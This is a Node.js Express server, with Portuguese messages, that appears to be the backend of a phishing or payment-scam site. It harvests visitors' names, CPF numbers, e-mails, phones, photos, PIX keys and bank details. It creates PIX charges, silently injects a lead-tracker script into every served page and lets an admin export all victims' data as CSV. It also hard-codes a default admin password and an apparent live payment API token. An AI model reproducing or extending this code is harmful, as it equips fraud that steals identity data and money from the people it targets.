const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const express = require('express');
const { Store } = require('./store');
const pixzy = require('./pixzy');

function loadEnv() {
  const file = path.join(__dirname, '..', '.env');
  if (!fs.existsSync(file)) return;
  for (const line of fs.readFileSync(file, 'utf8').split(/\r?\n/)) {
    const t = line.trim();
    if (!t || t.startsWith('#')) continue;
    const i = t.indexOf('=');
    if (i < 1) continue;
    const key = t.slice(0, i).trim();
    let val = t.slice(i + 1).trim();
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1);
    }
    if (process.env[key] == null) process.env[key] = val;
  }
}
loadEnv();

const ROOT = path.join(__dirname, '..');
const DATA_DIR = process.env.DATA_DIR || path.join(ROOT, 'data');
const PORT = Number(process.env.PORT || 3000);
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'SuperYes#admin';
const ADMIN_SECRET = process.env.ADMIN_SECRET || crypto.randomBytes(24).toString('hex');
const PIXZY_TOKEN = process.env.PIXZY_TOKEN || '662|E9ZcJF8XzHCHcvaFE4zR97AGYB13Sz2QrVOMbKBGaa48511d';
const PUBLIC_URL = (process.env.PUBLIC_URL || 'https://atualizadoshojesim.onrender.com').replace(/\/$/, '');

const store = new Store(DATA_DIR);
const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);
app.use(express.json({ limit: '12mb' }));

function signSession() {
  const exp = Date.now() + 7 * 24 * 60 * 60 * 1000;
  const data = Buffer.from(JSON.stringify({ u: ADMIN_USER, exp })).toString('base64url');
  const sig = crypto.createHmac('sha256', ADMIN_SECRET).update(data).digest('base64url');
  return `${data}.${sig}`;
}

function readSession(req) {
  const cookie = String(req.headers.cookie || '');
  const match = cookie.match(/(?:^|; )admin_session=([^;]+)/);
  if (!match) return null;
  const [data, sig] = decodeURIComponent(match[1]).split('.');
  if (!data || !sig) return null;
  const expected = crypto.createHmac('sha256', ADMIN_SECRET).update(data).digest('base64url');
  const a = Buffer.from(sig);
  const b = Buffer.from(expected);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return null;
  try {
    const payload = JSON.parse(Buffer.from(data, 'base64url').toString('utf8'));
    if (payload.exp < Date.now()) return null;
    return payload;
  } catch {
    return null;
  }
}

function requireAdmin(req, res, next) {
  if (!readSession(req)) {
    return res.status(401).json({ error: 'Não autorizado' });
  }
  next();
}

function visitorId(req) {
  return String(req.body.visitorId || req.body.visitor_id || '').slice(0, 80);
}

function publicBase(req) {
  if (PUBLIC_URL) return PUBLIC_URL;
  const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  return `${proto}://${host}`;
}

app.post('/api/pix/create', async (req, res) => {
  try {
    if (!PIXZY_TOKEN) {
      return res.status(503).json({ error: 'PIXZY_TOKEN não configurado no Render.' });
    }
    const customer = {
      name: req.body.name,
      email: req.body.email,
      document: req.body.document || req.body.cpf,
      phone: req.body.phone || req.body.telefone,
    };
    if (!customer.name || !customer.email || !customer.document) {
      return res.status(400).json({ error: 'Nome, e-mail e CPF são obrigatórios.' });
    }
    const charge = await pixzy.createCharge({
      token: PIXZY_TOKEN,
      product: req.body.product || 'final-seguro',
      customer,
      tracking: req.body.tracking || {},
      webhookUrl: `${publicBase(req)}/api/pix/webhook`,
      ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    });
    await store.savePix({
      visitorId: visitorId(req),
      cpf: customer.document,
      type: 'create',
      product: req.body.product,
      page: req.body.product,
      transactionId: charge.transactionId,
      qrCode: charge.qrCode,
      amount: charge.amount,
      status: charge.status,
    });
    await store.upsertLead({
      visitorId: visitorId(req) || undefined,
      step: req.body.product || 'pix',
      fields: {
        nome: customer.name,
        email: customer.email,
        cpf: customer.document,
        telefone: customer.phone,
      },
    });
    res.json(charge);
  } catch (err) {
    res.status(err.status || 400).json({ error: err.message || 'Falha ao gerar o PIX.' });
  }
});

app.get('/api/pix/status', async (req, res) => {
  try {
    if (!PIXZY_TOKEN) {
      return res.status(503).json({ error: 'PIXZY_TOKEN não configurado no Render.' });
    }
    const id = req.query.id;
    if (!id) return res.status(400).json({ error: 'id obrigatório' });
    const charge = await pixzy.getCharge({ token: PIXZY_TOKEN, id });
    await store.savePix({
      type: 'status',
      transactionId: charge.transactionId,
      qrCode: charge.qrCode,
      amount: charge.amount,
      status: charge.status,
    });
    res.json(charge);
  } catch (err) {
    res.status(err.status || 400).json({ error: err.message || 'Falha ao consultar PIX.' });
  }
});

app.post('/api/pix/webhook', async (req, res) => {
  try {
    const body = req.body || {};
    const tx = body.transaction || body.data || body;
    const event = String(body.event || tx.status || '').toLowerCase();
    const id = tx.transaction_id || tx.id || body.transaction_id;
    const status = pixzy.mapStatus(event === 'paid' || event === 'transaction_paid' ? 'paid' : (tx.status || event));
    if (id) {
      await store.savePix({
        type: 'webhook',
        transactionId: String(id),
        qrCode: tx.br_code || tx.qr_code,
        amount: tx.amount,
        status,
        product: (tx.metadata && tx.metadata.product) || '',
      });
    }
    res.json({ ok: true });
  } catch (err) {
    res.status(200).json({ ok: false });
  }
});

app.post('/api/ingest/lead', async (req, res) => {
  try {
    const lead = await store.upsertLead({
      visitorId: visitorId(req) || undefined,
      step: req.body.step,
      fields: req.body.fields || req.body,
    });
    res.json({ ok: true, id: lead.id });
  } catch (err) {
    res.status(400).json({ error: err.message || 'Falha ao salvar lead' });
  }
});

app.post('/api/ingest/photo', async (req, res) => {
  try {
    const vid = visitorId(req);
    if (!vid) return res.status(400).json({ error: 'visitorId obrigatório' });
    const saved = await store.savePhoto(vid, req.body.image || req.body.dataUrl);
    res.json({ ok: true, ...saved });
  } catch (err) {
    res.status(400).json({ error: err.message || 'Falha ao salvar foto' });
  }
});

app.post('/api/ingest/pix', async (req, res) => {
  try {
    let requestBody = req.body.request;
    if (typeof requestBody === 'string') {
      try { requestBody = JSON.parse(requestBody); } catch { requestBody = {}; }
    }
    const response = req.body.response || {};
    const rec = await store.savePix({
      visitorId: visitorId(req),
      cpf: (requestBody && (requestBody.document || requestBody.cpf)) || req.body.cpf,
      type: req.body.type,
      product: req.body.product || (requestBody && requestBody.product) || response.product,
      page: req.body.page,
      transactionId: req.body.transactionId || response.transactionId || response.id,
      qrCode: req.body.qrCode || response.qrCode || response.qr_code || response.copyPaste,
      amount: req.body.amount || response.amount,
      status: req.body.status || response.status || 'pending',
    });
    if (requestBody && (requestBody.name || requestBody.email || requestBody.document)) {
      await store.upsertLead({
        visitorId: visitorId(req),
        step: req.body.page || 'pix',
        fields: {
          nome: requestBody.name,
          email: requestBody.email,
          cpf: requestBody.document,
          telefone: requestBody.phone,
        },
      });
    }
    res.json({ ok: true, id: rec.id });
  } catch (err) {
    res.status(400).json({ error: err.message || 'Falha ao salvar PIX' });
  }
});

app.get('/api/admin/me', (req, res) => {
  const session = readSession(req);
  if (!session) return res.status(401).json({ ok: false });
  res.json({ ok: true, user: ADMIN_USER });
});

function safeEq(a, b) {
  const aa = Buffer.from(String(a));
  const bb = Buffer.from(String(b));
  const len = Math.max(aa.length, bb.length, 1);
  const pa = Buffer.alloc(len);
  const pb = Buffer.alloc(len);
  aa.copy(pa);
  bb.copy(pb);
  return crypto.timingSafeEqual(pa, pb) && aa.length === bb.length;
}

function sessionCookie(value, maxAge) {
  return `admin_session=${value}; HttpOnly; Path=/; SameSite=Lax; Max-Age=${maxAge}; Secure`;
}

app.post('/api/admin/login', (req, res) => {
  const user = String(req.body.user || req.body.username || '');
  const password = String(req.body.password || '');
  if (!safeEq(user, ADMIN_USER) || !safeEq(password, ADMIN_PASSWORD)) {
    return res.status(401).json({ error: 'Usuário ou senha inválidos' });
  }
  res.setHeader('Set-Cookie', sessionCookie(signSession(), 604800));
  res.json({ ok: true });
});

app.post('/api/admin/logout', (req, res) => {
  res.setHeader('Set-Cookie', sessionCookie('', 0));
  res.json({ ok: true });
});

app.get('/api/admin/stats', requireAdmin, (req, res) => {
  res.json({ ...store.stats(), gateway: 'Pixzy' });
});

app.get('/api/admin/leads', requireAdmin, (req, res) => {
  res.json(store.listLeads(req.query.q));
});

app.get('/api/admin/leads/:id', requireAdmin, (req, res) => {
  const lead = store.getLead(req.params.id);
  if (!lead) return res.status(404).json({ error: 'Lead não encontrado' });
  res.json(lead);
});

app.get('/api/admin/leads/:id/photos/:file', requireAdmin, (req, res) => {
  const file = store.photoPath(req.params.id, req.params.file);
  if (!file) return res.status(404).end();
  res.sendFile(file);
});

app.get('/api/admin/export.csv', requireAdmin, (req, res) => {
  const rows = store.listLeads('');
  const headers = ['id', 'createdAt', 'nome', 'cpf', 'email', 'telefone', 'chavePix', 'banco', 'valor', 'step'];
  const csv = [headers.join(',')].concat(rows.map((r) => headers.map((h) => {
    const val = String(r[h] || '').replace(/"/g, '""');
    return `"${val}"`;
  }).join(','))).join('\n');
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="leads.csv"');
  res.send('\uFEFF' + csv);
});

app.get(['/admin', '/admin/'], (req, res) => {
  res.sendFile(path.join(ROOT, 'admin', 'index.html'));
});

const SKIP_STATIC = new Set(['/admin', '/api', '/data', '/server', '/node_modules']);

app.use((req, res, next) => {
  if (req.method !== 'GET' && req.method !== 'HEAD') return next();
  const first = req.path.split('/').filter(Boolean)[0];
  if (SKIP_STATIC.has('/' + (first || '')) || req.path.startsWith('/api/')) return next();

  let rel = req.path === '/' ? '/index.html' : req.path;
  if (rel.endsWith('/')) rel += 'index.html';
  const file = path.resolve(ROOT, '.' + rel);
  if (!file.startsWith(ROOT) || !fs.existsSync(file) || !fs.statSync(file).isFile()) return next();

  if (file.endsWith('.html')) {
    let html = fs.readFileSync(file, 'utf8');
    if (!html.includes('lead-tracker.js')) {
      const tag = '<script src="/js/lead-tracker.js" defer></script>';
      html = /<\/body>/i.test(html) ? html.replace(/<\/body>/i, `${tag}</body>`) : html + tag;
    }
    res.type('html').send(html);
    return;
  }
  res.sendFile(file);
});

app.use(express.static(ROOT, {
  index: false,
  dotfiles: 'ignore',
  setHeaders(res, filePath) {
    if (filePath.endsWith('.mp4')) {
      res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
    }
  },
}));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Superis on :${PORT}`);
  console.log(`Admin: /admin  user=${ADMIN_USER}`);
});
